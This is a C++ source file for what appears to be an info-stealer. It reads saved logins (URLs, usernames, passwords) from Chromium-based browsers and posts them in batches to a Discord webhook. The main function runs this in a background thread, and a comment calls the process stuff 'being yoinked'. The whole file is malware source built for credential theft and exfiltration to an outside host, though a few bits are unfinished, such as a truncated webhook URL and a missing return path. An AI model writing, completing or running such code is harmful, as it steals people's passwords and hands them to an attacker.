#define WIN32_LEAN_AND_MEAN

#include "build.hpp"

#include "chromium.hpp"
#include "crypto.hpp"
#include "http.hpp"

#include <sstream>
#include <iostream>

#define DISCORD_ID long long

bool send_message(std::string message)
{
    http::HttpClient client;

    http::dict headers = {
        {"Content-Type", "application/json"}
    };

    http::parameters data(http::dict{
        {"content", message}
    });

    http::response response;
    for(int i = 0; i < 5; i++)
    {
        response = client.REQUEST(http::method::POST, "https://discord.com/api/webhooks/", data.json(), headers);
        if (response.code() == 429)
        {
            Sleep(1000);
            continue;
        }
        else
        {
            Sleep(100);
            return true;
        }
    }
}

void background_worker()
{
    for (auto& browser : chromium::paths)
    {
        auto logins = chromium::get_logins(browser.first);

        std::stringstream ss;
        ss << "```\\n";

        for (int i = 0; i < logins.size(); i++)
        {
            auto login = logins.at(i);

            if (i % 2 == 0 && i > 0)
            {
                ss << "\\n```";

                send_message(ss.str());

                ss.str(std::string());

                ss << "```\\n";
            }

            if (!login.url.empty()) ss << "URL: " << login.url << "\\n";
            if (!login.username.empty()) ss << "Username: " << login.username << "\\n";
            if (!login.password.empty()) ss << "Password: " << login.password << "\\n";
            ss << "test\\n";

            ss << "\\n";
        }
    }
}

int main()
{
    std::thread worker(background_worker);
    
    // Do work while stuff being yoinked.
    
    worker.join();

    return 0;
}
